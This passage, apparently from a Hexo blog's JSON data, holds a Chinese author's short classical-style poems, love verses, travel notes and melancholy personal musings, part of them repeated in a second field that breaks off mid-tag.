title=\"游戏日随笔\"></a>游戏日随笔</h1><p>我就像一个赌徒,拿着全部身家在游戏的桌子上面疯狂投掷.<br>每当输掉一次,就重新撕开一次伤口,并在上面洒满了盐巴,当你看到我满身的伤痕,<br>不要害怕,不要惊讶,也不要看不起,这是活着的证明,也是不以他人意志为转移的信仰.<br>这场疯狂的赌博,没有人可以全身而退,只能不断榨干自身的鲜血,学识,修养,器官以及决绝意志.<br>死亡亦不可超脱,唯有爱在赌博中扎根深种.才可以实现升华.<br>爱你,爱世人,你是唯一的,世人是涩苦的,都需要爱来兼容.<br>是谁繁华了你的寂寞 2020-09-13</p>\n<h1 id=\"海日阵\"><a href=\"#海日阵\" class=\"headerlink\" title=\"海日阵\"></a>海日阵</h1><p>仙山白底黑为顶，万军冲杀云做盘。<br>海连天日我为客，墨染春秋点点杀。</p>\n<h1 id=\"情人节快乐\"><a href=\"#情人节快乐\" class=\"headerlink\" title=\"情人节快乐\"></a>情人节快乐</h1><p>我与秋风皆过客，你携春水揽星河。<br>我有岁月可回首，你以深情赴白头。<br>我生有幸遇见你，你许一人尽偏爱。<br>我有诗酒三十六，你爱美人渐无书。<br>我问归期几多时，你却君王不早朝。<br>我执玲珑安红豆，你说无关风与月。<br>我要人生如初见，你送悲扇事秋风。<br>我在去年今日时，你捻桃花手折枝。</p>\n<p>送给你们朋友圈秀恩爱的。<br>祝你们白头偕老，寿比南山。</p>\n<h1 id=\"深夜\"><a href=\"#深夜\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>盼夜归星辰，知晨曦日耀。</p>\n<h1 id=\"路\"><a href=\"#路\" class=\"headerlink\" title=\"路\"></a>路</h1><p>刀不断是非，剑难解一仇。<br>弃刀绝剑去，杨柳草依依。</p>\n<h1 id=\"路-1\"><a href=\"#路-1\" class=\"headerlink\" title=\"路\"></a>路</h1><p>何处是归途，证我大名道。<br>红尘纷乱乱，到底意难平。</p>\n<h1 id=\"愁\"><a href=\"#愁\" class=\"headerlink\" title=\"愁\"></a>愁</h1><p>又几多愁，旧日春光洒满头。<br>满城悲絮，一口浊气牵肠去。</p>\n<h1 id=\"深夜-1\"><a href=\"#深夜-1\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>星河旧冷夜成眠，月殿回暖梦无时。<br>啼喃起伏阵阵音，淡落霜打枯枯意。</p>\n<h1 id=\"秋知佛\"><a href=\"#秋知佛\" class=\"headerlink\" title=\"秋知佛\"></a>秋知佛</h1><p>千灯湖塔亮人家，西樵百步承风雨。<br>祖庭怒火显武世，中南海里演国仇</p>\n<h1 id=\"明志\"><a href=\"#明志\" class=\"headerlink\" title=\"明志\"></a>明志</h1><p>誓要乾坤清，付予天地明。<br>纵有千百恨，不惧万世冤。</p>\n<h1 id=\"上班去\"><a href=\"#上班去\" class=\"headerlink\" title=\"上班去\"></a>上班去</h1><p>蓝甲战衣穿胸膛，风雨雷电伴耳旁。<br>朝圣路上多诘难，不觉已到昆仑虚。</p>\n<h1 id=\"好走\"><a href=\"#好走\" class=\"headerlink\" title=\"好走\"></a>好走</h1><p>事别经年，我该如何称呼你的青春，是献给了理想，还是献祭了理想？</p>\n<h1 id=\"好走-1\"><a href=\"#好走-1\" class=\"headerlink\" title=\"好走\"></a>好走</h1><p>轻风细雨，杂音喧闹，满身泥泞的少年，无人问津的路！</p>\n<h1 id=\"愧然也\"><a href=\"#愧然也\" class=\"headerlink\" title=\"愧然也\"></a>愧然也</h1><p>半月封尘半月圆，清风协隐清风喧。<br>藏月愧日量归期，自咏半月还锦瑟。</p>\n<h1 id=\"深夜-2\"><a href=\"#深夜-2\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>吾夜观星象，必当亡于辰时三刻。<br>当神游物外，飞天巡视列御四方。</p>\n<h1 id=\"成功的方法只有一个-就是以你喜欢的方式活下去\"><a href=\"#成功的方法只有一个-就是以你喜欢的方式活下去\" class=\"headerlink\" title=\"成功的方法只有一个,就是以你喜欢的方式活下去\"></a>成功的方法只有一个,就是以你喜欢的方式活下去</h1><p>坚信无论经过多少黑暗与苦难，那传说了无数次，忽悠了无数回，却始终未见的太平盛世，终会到来。<br>–魏忠贤时代。</p>\n<h1 id=\"你的BGM\"><a href=\"#你的BGM\" class=\"headerlink\" title=\"你的BGM\"></a>你的BGM</h1><p>青云天上敬豪客，话聊红尘琴一曲。<br>日月星辰路上人，悠扬大风歌一首。</p>\n<h1 id=\"生来悲徨\"><a href=\"#生来悲徨\" class=\"headerlink\" title=\"生来悲徨\"></a>生来悲徨</h1><p>心中一片悲凉意，化作此刻剑来时。<br>持剑纵横捭阖家，难敌千夫幻心指。</p>\n<h1 id=\"感\"><a href=\"#感\" class=\"headerlink\" title=\"感\"></a>感</h1><p>人从悲哀中落落大方走出来<br>就是艺术家</p>\n<h1 id=\"金帛春日远游记\"><a href=\"#金帛春日远游记\" class=\"headerlink\" title=\"金帛春日远游记.\"></a>金帛春日远游记.</h1><p>与友别赠青云.至真情且意坚.<br>常思决绝不下,神游天寻古月.<br>念念欲归未得,悔与不深之言.<br>有前程可奔赴,有岁月可回首.</p>\n<h1 id=\"再遇\"><a href=\"#再遇\" class=\"headerlink\" title=\"再遇\"></a>再遇</h1><p>愿你自再遇见，无波澜，问安如友。</p>\n<h1 id=\"论韭菜\"><a href=\"#论韭菜\" class=\"headerlink\" title=\"论韭菜\"></a>论韭菜</h1><p>我向左边看是七暗公主，我向右边看是佳俏’公子’。用色彩勾勒的七彩祥云，加了一勺暗元素，还有一个缺失的人格，这是一个完美状态。用波澜不惊的态度，遮盖讶疑的双眼，又是上扬的嘴角，仿佛看了透少年的拘谨。这些事情，请孩子们啊尽早体会，若是到了索然无味的阶段，心率会一直保持在50下，这才是真正的死了，我问一句，你死了吗？你默不作声，不敢相信自己死了似的，承认它又太难了，就这样不上不下的做根韭菜，又有什么不好。谁能回答呢？</p>\n<h1 id=\"感-1\"><a href=\"#感-1\" class=\"headerlink\" title=\"感\"></a>感</h1><p>春雨    催    眠人，樱花     打    诗雨。<br>青峰    惘    然已，天桥     过    路己。</p>\n<h1 id=\"感-2\"><a href=\"#感-2\" class=\"headerlink\" title=\"感\"></a>感</h1><p>又是春一季，风与花不同。孤独又上了一层楼，交流的成本竟然花掉了我的三块竹子，原以为包容是可以解决一切问题的，后来发现，还是俗入人心，骚人与自由才是完美的一对，那堪堪的能让自己悲伤呢。每夜一丝尘，腐腐眼眸里。金时烟花放，寄入浮光里！</p>\n<p>我会忘了与你的一切！</p>\n<h1 id=\"情\"><a href=\"#情\" class=\"headerlink\" title=\"情\"></a>情</h1><p>弯眉掷枪手执箭，寒风不挡霓裳舞。百战金装身上衣，别有一番英武气！</p>\n<p>认识一妹子,因其特殊经历,好久想给其作诗,但一直无缘灵感.今一朝闻面,10分钟内做出一首打油诗.做的不好,讨大家个乐,小年吉祥.也祝你新的一年事事顺心!</p>\n<h1 id=\"乐\"><a href=\"#乐\" class=\"headerlink\" title=\"乐\"></a>乐</h1><p>文墨我所忆，才女我所追。窈窕我所赏，一生我所执。</p>\n<h1 id=\"只如初见\"><a href=\"#只如初见\" class=\"headerlink\" title=\"只如初见\"></a>只如初见</h1><p>纤弱细骨，柔英无眉，以淡淡热香之力，使人不敢妄动。惟只按下躁动之心，以求诸佛佑我行！轻嘤袅袅，婷婷扑面，左右似是仙鹤隐空，虚中望人定身。仙女下凡不外如是，尝过人间百事，更有一丝韵殇其中。醉不可收，溺惘在深谭。</p>\n<h1 id=\"佳句\"><a href=\"#佳句\" class=\"headerlink\" title=\"佳句\"></a>佳句</h1><p>春寒料峭深深绿，姹紫嫣红百样好！</p>\n<p>天空之城初相识，恨晚晴霞彩云追。</p>\n<h1 id=\"心境之路\"><a href=\"#心境之路\" class=\"headerlink\" title=\"心境之路\"></a>心境之路</h1><p>在这繁华的盛世里，逐利，是我对自己画的圈，一辈子还逃的开吗？剑胆破晓时刻，在求剑船上已注定，不近！伸着脸喝着红酒，暗想还有哪一计可以让我走的更顺心，想到最后，一句随心。是谁繁华了你的寂寞-第三章第10节</p>\n<h1 id=\"思国\"><a href=\"#思国\" class=\"headerlink\" title=\"思国\"></a>思国</h1><p>深夜识鬼忘川雨，撩动人心古琴音。</p>\n<p>百年一梦鼓浪屿，至今思迁一海峡！</p>\n<h1 id=\"暖\"><a href=\"#暖\" class=\"headerlink\" title=\"暖\"></a>暖</h1><p>禾木剜心红耳汤，前世茫茫不思量。暖人暖世煖春风，相知相伴香一生！</p>\n<h1 id=\"一次失恋\"><a href=\"#一次失恋\" class=\"headerlink\" title=\"一次失恋\"></a>一次失恋</h1><p>夏初，是悲伤的开始，刚刚孕育的花朵，经不起暴晒，退缩成为了我的常态，没有茁壮的枝干，又怎能生出依偎来？是我不好，没有让你快乐的勇气，一切的道歉都像是在对自己诉说。余生的红色都给了这些时光，再也不会有咸涩滴落！</p>\n<h1 id=\"三句情诗\"><a href=\"#三句情诗\" class=\"headerlink\" title=\"三句情诗\"></a>三句情诗</h1><p>深夜</p>\n<p>想你和梦</p>\n<p>都开始了</p>\n<h1 id=\"深爱\"><a href=\"#深爱\" class=\"headerlink\" title=\"深爱\"></a>深爱</h1><p>爱的那么深刻，又几遇能相释怀，倾尽所有告诉你的眼睛，我的味道与你相融。彼此纠缠不管是相克犯煞，还是怨恨有憎，都逃不开内心的焦灼。与你以礼相敬，即隔山海，也爱你之所爱，亲你之所亲。﻿</p>\n<p>我愿与你桃花三千时相伴，更白守少年誓言。</p>\n<h1 id=\"2017初雪\"><a href=\"#2017初雪\" class=\"headerlink\" title=\"2017初雪\"></a>2017初雪</h1><p>深夜下雪，思故人。归来归来，仍落地不见，我思念你，思念你如雪默，寂静无声，冷彻寒骨。再见你，白雪送佳人，萧瑟独行客。</p>\n<h1 id=\"归来\"><a href=\"#归来\" class=\"headerlink\" title=\"归来\"></a>归来</h1><p>尘埃浮现，镜台亦拂拭轻吟。良月当空，往事都随风过处。饭香浓思，深潭有雾气缭绕。八齿齐放，脸颊也鱼尾三重。十年啄灼，栖息好静安书斋。残棋四九，缺一是生离死别。千里不息，天河游鱼龙豚舞。百世聚仁，情且行德怨恩仇。</p>\n<h1 id=\"是谁繁华了我的寂寞-2017-11-7\"><a href=\"#是谁繁华了我的寂寞-2017-11-7\" class=\"headerlink\" title=\"是谁繁华了我的寂寞 2017.11.7\"></a>是谁繁华了我的寂寞 2017.11.7</h1><p>思绪混乱,各种负面情绪:语点的反应(我说出每句话的中心意思),丑陋的外表,邋遢的气息,颓废的心里,蠢弱的身体,活不到的快乐,得不到的尊重,歇斯底里的嘲讽.各种各样的交织,像黑暗一样吞噬着我.</p>\n<p>每一个小时我都会有,就这样活着有什么意思,这样的想法,剩下的59分59秒,我都在去努力改变一下.记录一下,虽然转瞬即逝.很现实,很悲哀.</p>\n<p>都在妄想不劳而获,都在想当一只蛀虫.心底里的想法,毫不犹豫的展现出来,仅仅伤害了别人吗?是否考虑过谁在背负着这些因果,谁在地狱里被红莲业火燃烧焦灼,谁在承受人情的无穷纠葛.</p>\n<p>浮夸的表演,不得不让我把你想得丑陋一些.造作的语句,冷漠的表情,都是对这个世界有情的伤害.</p>\n<p>就这样吧,就这样吧,我总是安于现状,不思改变,不求理解.</p>\n<p>秋雨  ∙  心安!</p>\n<h1 id=\"是谁繁华了你的寂寞-第三章第一节\"><a href=\"#是谁繁华了你的寂寞-第三章第一节\" class=\"headerlink\" title=\"是谁繁华了你的寂寞-第三章第一节\"></a>是谁繁华了你的寂寞-第三章第一节</h1><p>我的坚持得到过所有人的”背叛”，我所坚持下去的勇气，是无人可阻的！我可以抛弃所有的荣华富贵和身康体健，但我唯独不可以抛弃这股来自灵魂的信仰！自成以来，赶走无为，摘掉庸碌，救赎自我。世界与我再无敌意！</p>\n<h1 id=\"四月独好！\"><a href=\"#四月独好！\" class=\"headerlink\" title=\"四月独好！\"></a>四月独好！</h1><p>岁月停格刹那间，含苞晨光醉人眼。夜有蛙叫蚊来扰，叹出时光荏苒去！</p>\n<h1 id=\"怨我\"><a href=\"#怨我\" class=\"headerlink\" title=\"怨我\"></a>怨我</h1><p>怨我生在迷惘中，怨我献身欲望中，怨我轻轻折恨中，怨我重重复复中！怨我争争坚韧中，怨我事事躬亲中，怨我笑颜如花中，怨我俯首为牛中，怨我轮回天地中，怨我万事皆缠中，怨我生生世世中！</p>\n<h1 id=\"谢\"><a href=\"#谢\" class=\"headerlink\" title=\"谢\"></a>谢</h1><p>借朋友之口: 冰雪掩月夜，津口渡船归.少时鲤鱼跃,老来经天纬.</p>\n<h1 id=\"悦\"><a href=\"#悦\" class=\"headerlink\" title=\"悦\"></a>悦</h1><p>四月多才子，佳人好衣装。本来无一事，人悦花羞藏！</p>\n<h1 id=\"雨\"><a href=\"#雨\" class=\"headerlink\" title=\"雨\"></a>雨</h1><p>伞下一朵白莲花，惹人娇恼羞羞羞。风中几片墨绿叶，摇曳倩影闪闪闪！</p>\n<h1 id=\"忆\"><a href=\"#忆\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>月上柳梢冷，芽露浅浅白。沁雾深潭中，西施尤为醉！</p>\n<h1 id=\"游雨花新感\"><a href=\"#游雨花新感\" class=\"headerlink\" title=\"游雨花新感\"></a>游雨花新感</h1><p>始于茶树，进闻桂王；丁香五月，感人肺腑；层层叠嶂，不见高楼；春光乍现，寺隐绿深；九转十八，雨花阁下，樱白漫天，万物复苏！参天环绕，不见日照，景貌大纲，尽收眼下；﻿</p>\n<p>阶梯而下，又一乐处；重游温故，知新知心！</p>\n<h1 id=\"元宵节快乐\"><a href=\"#元宵节快乐\" class=\"headerlink\" title=\"元宵节快乐\"></a>元宵节快乐</h1><p>昨夜星辰，满腹经纶对谁说。今日元宵，灯舞闹心阑珊处！</p>\n<h1 id=\"思\"><a href=\"#思\" class=\"headerlink\" title=\"思\"></a>思</h1><p>就在那晚月圆，我赶走了所有思绪，独宠嫦娥！</p>\n<h1 id=\"失眠\"><a href=\"#失眠\" class=\"headerlink\" title=\"失眠\"></a>失眠</h1><p>锦衣插笔，夜断魂殇。百年的思绪，混乱了盛世。如云，如风，如空。不尽来，去不留！佛心命涅槃，金甲医疾患！何物可入命？无物可入心？</p>\n<h1 id=\"忏\"><a href=\"#忏\" class=\"headerlink\" title=\"忏\"></a>忏</h1><p>梦入伯牙子期风,醒时山伯英台墓.</p>\n<p>不甘流水无情花,深解琴瑟琵琶声.</p>\n<h1 id=\"未遇\"><a href=\"#未遇\" class=\"headerlink\" title=\"未遇\"></a>未遇</h1><p>未曾相遇却相念,十迁别离青负恨.</p>\n<p>老来应当苦含泪,不如当年勇依恒.</p>\n<p>自解:不曾相遇的你我,却甚是思念对方,你乔迁了十处,我一处不曾去看过,也一处不曾与我相近,你我的青年时光背负了莫大的恨意!当年使用的勇气,到老了,是否应该为此哭泣?现在想想,不如恒心立地,我心坚守!</p>\n<h1 id=\"游紫金山\"><a href=\"#游紫金山\" class=\"headerlink\" title=\"游紫金山\"></a>游紫金山</h1><p>玄武微凉沁颜色，颊红雾凌览人间。坡俏绳桥遮林叶，樱陀雨落急落石！</p>\n<h1 id=\"愿\"><a href=\"#愿\" class=\"headerlink\" title=\"愿\"></a>愿</h1><p>剪不清，理还乱！真心希望能遇到梦幻一般的女子，就像莲花般温柔。百合般天使！</p>\n<p>希望遇见我的人都能消灾解祸！</p>\n<p>熙熙攘攘七夕节，凄凄惨惨一人过！若要人生最美丽，还需痴心对嫦娥！</p>\n<p>我要去南方,在一个人多且少的地方,种下桂花树,等有缘人,取心而放!</p>\n<h1 id=\"秋游玄水坑\"><a href=\"#秋游玄水坑\" class=\"headerlink\" title=\"秋游玄水坑\"></a>秋游玄水坑</h1><p>碧水褐阳三丈起，青黄交接秋不寒。</p>\n<p>风南微兮发飞扬，鹤女婀娜语祥平！</p>\n<h1 id=\"明\"><a href=\"#明\" class=\"headerlink\" title=\"明\"></a>明</h1><p>一梦生,一梦明!</p>\n<h1 id=\"品\"><a href=\"#品\" class=\"headerlink\" title=\"品\"></a>品</h1><p>闻到花香，可以写诗，算是极好！看到食物，可以填腹，算是很好！偶吐心声，心情畅快，算是一般！夜思己身，痛哭流涕，算是极差！</p>\n<h1 id=\"困\"><a href=\"#困\" class=\"headerlink\" title=\"困\"></a>困</h1><p>天下谁人不是君，莫道君行独异人！</p>\n<p>偶得秦淮所思</p>\n<p>干了这一碗豪气，饮下此三杯九霄！你我共创义气盟，各自封王天下平！</p>\n<h1 id=\"农民工\"><a href=\"#农民工\" class=\"headerlink\" title=\"农民工\"></a>农民工</h1><p>一地凉席，铺尽了辛酸。</p>\n<h1 id=\"困-1\"><a href=\"#困-1\" class=\"headerlink\" title=\"困\"></a>困</h1><p>忆娇，品事之不公，扩心之舞想，然后能静心，而后明性，之后知路，最后行计</p>\n<h1 id=\"困-2\"><a href=\"#困-2\" class=\"headerlink\" title=\"困\"></a>困</h1><p>世人无人问津你的孤独，所以你觉得与生俱来，这只不过是人性凉薄的体现，而不是孤独主义者！孤独主义是王者的风范，是诗人的愤世，是凡人的常伴，是自己的静安！</p>\n<h1 id=\"困-3\"><a href=\"#困-3\" class=\"headerlink\" title=\"困\"></a>困</h1><p>那些卑微的梦想，被我藏匿到自己都触摸不到的地方！</p>\n<h1 id=\"眼\"><a href=\"#眼\" class=\"headerlink\" title=\"眼\"></a>眼</h1><p>那噙着水雾的深潭，是最触动心灵的地方！</p>\n<h1 id=\"忆-1\"><a href=\"#忆-1\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>每一句话都包含了你的感情,或浪荡不羁,或意气风发,或疯疯癫癫,或娇憨不已,让人情不自禁的喝起了春药一样的你!</p>\n<h1 id=\"短句\"><a href=\"#短句\" class=\"headerlink\" title=\"短句\"></a>短句</h1><p>空间的错误，造就了回忆的沙漏；时间的折射，成就了回忆的美好！与君本陌路，断桥偏相逢.不求人相伴，但求心相印。(张益铭补)</p>\n<h1 id=\"思-1\"><a href=\"#思-1\" class=\"headerlink\" title=\"思\"></a>思</h1><p>是谁折笔，洒了墨滴，断了回忆！望窗外秋雨，裂肝肠肺腑，融化了血水，染彩了宣墨！</p>\n<h1 id=\"梦青\"><a href=\"#梦青\" class=\"headerlink\" title=\"梦青\"></a>梦青</h1><p>人生如梦，聚散分离， 朝如春花幕凋零，几许相聚， 几许分离，缘来缘去岂随心。 青丝白发转眼间，漠然回首，几许沧桑在心头。 独自泪空流。(楼主之弟薛冰:我还是没那么坚强，感觉眼泪好不值钱，呵呵)!</p>\n<h1 id=\"思-2\"><a href=\"#思-2\" class=\"headerlink\" title=\"思\"></a>思</h1><p>地位人格有高低耶？曰：前低后高！又问：地位人格有贵贱耶？曰：前贵后贱！</p>\n<p>身份决定地位，地位决定品味，而不是智慧与道德决定的！智慧给予了人心明暗，道德给予了人心善恶，而不是身份与地位给予的！</p>\n<p>存在着为自己着想的人是我的一件幸事，存在着可以为他着想的我，也是我的一件幸事！</p>\n<p>错的对的，不是浮云，不是神马，而是你的，真实感受。对的错的，不是假的，不是虚的，就是你的，地位形势。错了有错，不需改正，不要证据，这是你的，醉生梦死。对了又对，心中有数，横眉冷对，不是你的，无上天堂！</p>\n<p>叠层阴霾，冷意秋节，灰冷；霞光薄薄，上善遮天，阴冷；己道奇罪，忠义仁耻，笑冷！</p>\n<p>梳发笼仙，盘于腰间，玉质共贵气天然，瓜鹅并舞曲一身！</p>\n<h1 id=\"火风\"><a href=\"#火风\" class=\"headerlink\" title=\"火风\"></a>火风</h1><p>天空黑色羽，灰烬了大地。飘逸过村来，落地风寂灭。</p>\n<h1 id=\"千里念\"><a href=\"#千里念\" class=\"headerlink\" title=\"千里念\"></a>千里念</h1><p>人隔千里外，又在思念谁？春去花已落，夏来树正茂。感叹好时节，莫要独修愁！</p>\n<h1 id=\"曹贼赋\"><a href=\"#曹贼赋\" class=\"headerlink\" title=\"曹贼赋\"></a>曹贼赋</h1><p>沛国生阿瞒，欲得盛名问许邵。五色禁洛阳，方知其胆能。欲学荆轲志，可负天下人。檄诏出陈留，挥师虎牢关。孤军西讨义，无人可比之！借得天子令，征得北方侯！</p>\n<p>北方有霸主，官渡一战之。得意春风铜雀台，欲锁二乔天下惊！马蹄奔蹴急，临门下荆州。三尺青釭剑，吐哺归心愿。再次击敌，犹如神助！投鞭断江意，撩发狂不知。位高气已傲，是为英姿败。壮心在千里，后人谁可知？一成一败间，功过今人论？</p>\n<h1 id=\"思-3\"><a href=\"#思-3\" class=\"headerlink\" title=\"思\"></a>思</h1><p>对于强者来说，陌生人的生命怎么有他自己付出的代价珍贵呢！</p>\n<p>胜利者是不该被正义所指责的!</p>\n<p>人间毕竟我就来一次，你就不能对我好点！</p>\n<p>你所期待的并不会立即实现，反而你所将要遗忘的会给你惊喜，是否参杂了命运的缘分，我不得而知！</p>\n<p>向前路叹一句，怎可在懈怠中度过余生！</p>\n<p>夜的辉煌，带给我莫名的惧怕，又给了我安谧的勇气，静心明性！</p>\n<p>悠然一梦，梦到了集市大会，梦到了瀑布千米，深山别墅！</p>\n<p>亦悠悠声漾，亦英英闻妙！</p>\n<p>一直支持我的，难道只有我的信念吗？我不想其他人都是我信念的排外者，说实话，我从高中就一直在抱怨，因为我的起点很低，但我不希望我的地位在社会上仍然很低，成长虽然需要时间，但我时间不多！我想成为更强大的东西，对啊！我想更强大！强大！强大到我成为一个独裁者！</p>\n<p>情之一字，跨过了日月星辰，走过了千山万水，沉在了人间烟火之中！</p>\n<h1 id=\"厌\"><a href=\"#厌\" class=\"headerlink\" title=\"厌\"></a>厌</h1><p>不要把钻石般的美好，去和你丑陋卑鄙龌龊的心灵相比。你身上渗出的毒液会沾染这个世界，还会空气传播的。</p>\n<p>不要让我的眼神鄙视你，好吗！</p>\n<p>每天深夜你们都是怎么抵抗孤独的呢？心痛到想歇斯底里的哭泣！</p>\n<h1 id=\"困-4\"><a href=\"#困-4\" class=\"headerlink\" title=\"困\"></a>困</h1><p>探索深渊的人，其天敌唯有光明！</p>\n<p>总是有一种失落在不经意间表露无疑。</p>\n<p>莫道今时离别恨，幸有知音懂我心！</p>\n<p>心有三千繁华结,身居盘虎卧龙气.</p>\n<p>要经得起寂寞，禁得起孤独的繁华。</p>\n<p>大丈夫生于盛世，当持戒子书，以训天下！</p>\n<p>时间谋杀了多少，在空间上能补足吗？</p>\n<p>如此卑微的我，在疯狂的贪欲下做出令人大吃一惊的结果（当然是让人嘲笑的事情）。命运真的不能更改吗？就像疯狂的地下城，疯狂的我。永远被系统所设定，映照在现实中。五年的压抑下我学会了很多，更让我明白伸手去践踏命运，掌握命运是会让人精神崩溃的。但—-我们就看着命运的手把自己推进无尽的深渊。不是的，他会让我更加的疯狂！给正在改变命运的朋友一句鼓励，不在沉默中呻吟，就在沉默中呐喊。</p>\n<p>每一个在这个世界行走的人，都有一个信念。他们或不被理解，或落魄，或遭到嘲笑，或遭受白眼，或被当作棋子，或被当作奴隶，或被反叛，或被围攻，但他们坚定，他们的苦楚也许普通人便能感受到，但他们的境界永远不是那些人可以理解的，他们的理想永远不可能被那些人触摸，他们与众不同。试图改变他们的人都是懦夫，是可耻者，那些人永远只能跟在他们的后面。仅仅献给独行者。</p>\n<p>生活的乐趣也许在于面对未知与恐惧，你会做出什么样的反应及思考！</p>\n<p>在黑暗中沉默太久，看世界的眼光都不对了！</p>\n<p>我的妄想症又加深了一步！奇迹，只在痛苦中诞生！</p>\n<p>择一城孤老!</p>\n<p>四六之都，应天一问？何日可期，？？？</p>\n<p>我奋斗了18年，不是为了和你一起喝喝咖啡那么简单!</p>\n<p>自由与快乐总是和任性相伴！</p>\n<p>总在开心时，时光漏出锋利的刀芒，恨不相逢未嫁时，远去换君一生安！</p>\n<p>生有所恋，却无所依！</p>\n<h1 id=\"忆-2\"><a href=\"#忆-2\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>记忆不曾忘却，回忆更增韵味。</p>\n<p>金辉满地，难得一厢思绪。</p>\n<p>我要向你表白，我每次遇见你心就会多跳几次，每次看见你就会忍不住想和你说话，每次说话就会有一种感觉，我不知道那是什么，但是我知道我好像了解你，理解你，喜欢你，爱上你！纪念我未恋先逝的爱情！</p>\n<p>等不尽的思念，扯不完的温柔！</p>\n<p>倚栏听风雨， 斜阳当空挂！</p>\n<p>我的信仰呀，你看到了吗？旅途正在走向正轨！前路仍是荆棘，但我已经有了方法，有了行动。</p>\n<p>三千繁华届，又起新征途！</p>\n<p>当我在深渊里望向那一缕阳光，我好像好想她！</p>\n<p>记忆封印在了虚空，我唯有想尽办法活下去，直到我能再爱你！</p>\n<p>你不懂我浅浅的忧伤，就像怀着香味的薰衣草，是远行的旅途，还是停下的脚步。残暑孤花婉辞唱，唯有末夏未凉人！</p>\n<h1 id=\"田香\"><a href=\"#田香\" class=\"headerlink\" title=\"田香\"></a>田香</h1><p>一身稻草香味，满天蜻蜓飞舞；灌道长河微冷，萤火停留多久？</p>\n<h1 id=\"闯江南\"><a href=\"#闯江南\" class=\"headerlink\" title=\"闯江南\"></a>闯江南</h1><p>我乘马归去，但见黄花已落！</p>\n<p>一把刀，一颗脑袋，一身包袱业力，行走世间！</p>\n<p>拔刀欲平天下，文制按刀不出鞘。</p>\n<h1 id=\"明月思念\"><a href=\"#明月思念\" class=\"headerlink\" title=\"明月思念\"></a>明月思念</h1><p>今夜月将明，不忘相思泪。蓦然回首望月光，照相眸里，洒进心里。</p>\n<p>蓦然回头望月光，照进眸里，洒进心里。今夜月将明，不忘相思泪。</p>\n<h1 id=\"短句-1\"><a href=\"#短句-1\" class=\"headerlink\" title=\"短句\"></a>短句</h1><p>两盏灯笼血染，一双绣花底藏。</p>\n<p>斜雨桑叶，落了一抹风情！</p>\n<p>岩尖回首，唯有当时苦奋时,浪前观望，仅在偶尔独乐哉!(和旭注)</p>\n<p>于一古镇相遇，风姿摇曳，执扇在手，猛然展开，轻轻浮晃，日月开合！是最美的风景！</p>\n<p>孤独的路，总是前行者的欢场！</p>\n<p>想着你，就是繁华了寂寞！</p>\n<h1 id=\"语录\"><a href=\"#语录\" class=\"headerlink\" title=\"语录\"></a>语录</h1><p>天地为师，舍邻为友。</p>\n<p>夜半不归宿，只为明日恩。怀只感恩心，可受昼夜苦！</p>\n<p>君子爱财，取之有道；君子喜色，爱之有德。</p>\n<h1 id=\"双意\"><a href=\"#双意\" class=\"headerlink\" title=\"双意\"></a>双意</h1><p>瑟瑟萧风一杆抢，迷茫双眼寻与梦。何时修得人来时，沾得一枪洞中血。</p>\n<h1 id=\"乞公\"><a href=\"#乞公\" class=\"headerlink\" title=\"乞公\"></a>乞公</h1><p>楼前乞骨泣，楼上香四溢。看拆迁事宜，品人生住房。</p>\n<h1 id=\"逝流年\"><a href=\"#逝流年\" class=\"headerlink\" title=\"逝流年\"></a>逝流年</h1><p>折笔追忆，似水年华。情至于此，流年无痕。</p>\n<h1 id=\"长恨当年\"><a href=\"#长恨当年\" class=\"headerlink\" title=\"长恨当年\"></a>长恨当年</h1><p>半生两年一半，月半迷心，相思泪已。佳月披身，眼神浮空，六神无主，离心魂去，金香能否再吻？不知音，不知貌，忘名又忘姓。难恨天，难恨地，长恨己！</p>\n<h1 id=\"青葱迷茫\"><a href=\"#青葱迷茫\" class=\"headerlink\" title=\"青葱迷茫\"></a>青葱迷茫</h1><p>一心明月，奈何沟渠。奈奈心落，悲悲无情。人生二十年，只凉不悲，只欢不乐，只说不做。笔下纸上，赫然在目。</p>\n<h1 id=\"美色\"><a href=\"#美色\" class=\"headerlink\" title=\"美色\"></a>美色</h1><p>妖姬美色，难以忘却，当年的人，没有如此妖媚，却更加引人遐思！这么多年的你，堕落进了凡尘了吗？</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"游戏日随笔\"><a href=\"#游戏日随笔\" class=\"headerlink\" title=\"游戏日随笔\"></a>游戏日随笔</h1><p>我就像一个赌徒,拿着全部身家在游戏的桌子上面疯狂投掷.<br>每当输掉一次,就重新撕开一次伤口,并在上面洒满了盐巴,当你看到我满身的伤痕,<br>不要害怕,不要惊讶,也不要看不起,这是活着的证明,也是不以他人意志为转移的信仰.<br>这场疯狂的赌博,没有人可以全身而退,只能不断榨干自身的鲜血,学识,修养,器官以及决绝意志.<br>死亡亦不可超脱,唯有爱在赌博中扎根深种.才可以实现升华.<br>爱你,爱世人,你是唯一的,世人是涩苦的,都需要爱来兼容.<br>是谁繁华了你的寂寞 2020-09-13</p>\n<h1 id=\"海日阵\"><a href=\"#海日阵\" class=\"headerlink\" title=\"海日阵\"></a>海日阵</h1><p>仙山白底黑为顶，万军冲杀云做盘。<br>海连天日我为客，墨染春秋点点杀。</p>\n<h1 id=\"情人节快乐\"><a href=\"#情人节快乐\" class=\"headerlink\" title=\"情人节快乐\"></a>情人节快乐</h1><p>我与秋风皆过客，你携春水揽星河。<br>我有岁月可回首，你以深情赴白头。<br>我生有幸遇见你，你许一人尽偏爱。<br>我有诗酒三十六，你爱美人渐无书。<br>我问归期几多时，你却君王不早朝。<br>我执玲珑安红豆，你说无关风与月。<br>我要人生如初见，你送悲扇事秋风。<br>我在去年今日时，你捻桃花手折枝。</p>\n<p>送给你们朋友圈秀恩爱的。<br>祝你们白头偕老，寿比南山。</p>\n<h1 id=\"深夜\"><a href=\"#深夜\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>盼夜归星辰，知晨曦日耀。</p>\n<h1 id=\"路\"><a href=\"#路\" class=\"headerlink\" title=\"路\"></a>路</h1><p>刀不断是非，剑难解一仇。<br>弃刀绝剑去，杨柳草依依。</p>\n<h1 id=\"路-1\"><a href=\"#路-1\" class=\"headerlink\" title=\"路\"></a>路</h1><p>何处是归途，证我大名道。<br>红尘纷乱乱，到底意难平。</p>\n<h1 id=\"愁\"><a 